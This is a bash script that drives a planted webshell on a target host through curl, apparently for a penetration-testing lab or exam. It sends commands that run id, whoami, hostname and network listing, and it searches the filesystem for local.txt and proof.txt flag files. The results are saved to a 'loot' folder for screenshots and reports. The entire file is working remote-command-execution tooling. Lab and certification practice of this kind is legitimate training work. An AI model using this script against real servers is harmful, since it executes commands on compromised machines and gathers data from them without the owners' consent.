#!/usr/bin/env bash
# getproof — run the proof recipe (id/hostname/local/proof) through a webshell and save it screenshot-ready.
# Captures id + hostname + ip/whoami + local.txt + proof.txt (searched if not in the
# usual spots), to loot/<label>/proof-*.txt and to your screen.
#
# Usage:  ./getproof.sh <label> <shell-url> [param] [GET|POST]
# Example: ./getproof.sh app3 http://target/extramile/s.php 0 GET
set -uo pipefail
LABEL="${1:?usage: getproof.sh <label> <shell-url> [param] [GET|POST]}"
URL="${2:?need shell url}"; PARAM="${3:-0}"; METHOD="${4:-GET}"
DIR="loot/$LABEL"; mkdir -p "$DIR"
OUT="$DIR/proof-$(date -u +%H%M%S).txt"

CMD='echo "=== whoami/id ==="; id 2>/dev/null; whoami 2>/dev/null; echo "=== hostname ==="; hostname 2>/dev/null; echo "=== net ==="; (ip a 2>/dev/null || ipconfig 2>/dev/null); echo "=== local.txt ==="; cat local.txt ./local.txt 2>/dev/null; find / -maxdepth 5 -name local.txt 2>/dev/null -exec echo {} \; -exec cat {} \; ; echo "=== proof.txt ==="; cat /proof.txt /root/proof.txt 2>/dev/null; find / -maxdepth 5 -name proof.txt 2>/dev/null -exec echo {} \; -exec cat {} \;'

if [ "$METHOD" = POST ]; then
  resp=$(curl -s --max-time 40 "$URL" --data-urlencode "$PARAM=$CMD")
else
  resp=$(curl -s --max-time 40 -G "$URL" --data-urlencode "$PARAM=$CMD")
fi
{ echo "# proof for $LABEL  @ $(date -u '+%Y-%m-%d %H:%M:%SZ')"; echo "# via $METHOD $URL ($PARAM=)"; echo; printf '%s\n' "$resp"; } | tee "$OUT"
echo; echo "[*] saved -> $OUT  (screenshot this, and the values go in report-$LABEL.md)"
